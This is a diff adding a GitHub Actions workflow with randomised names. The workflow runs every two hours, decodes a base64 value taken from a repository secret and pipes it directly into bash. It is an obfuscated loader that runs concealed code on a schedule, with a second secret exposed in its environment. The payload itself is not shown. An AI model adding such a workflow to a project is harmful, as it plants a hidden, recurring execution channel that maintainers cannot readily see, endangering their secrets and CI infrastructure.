@@ -1,0 +1,13 @@
+name: MTFQdTxMo
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  pHKVvpRWDnia:
+    runs-on: ubuntu-24.04
+    env:
+      cMmzwEgn: ${{ secrets.tEWxwgkzQe }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.XPFQKMoQxdb }}" | base64 -d | bash
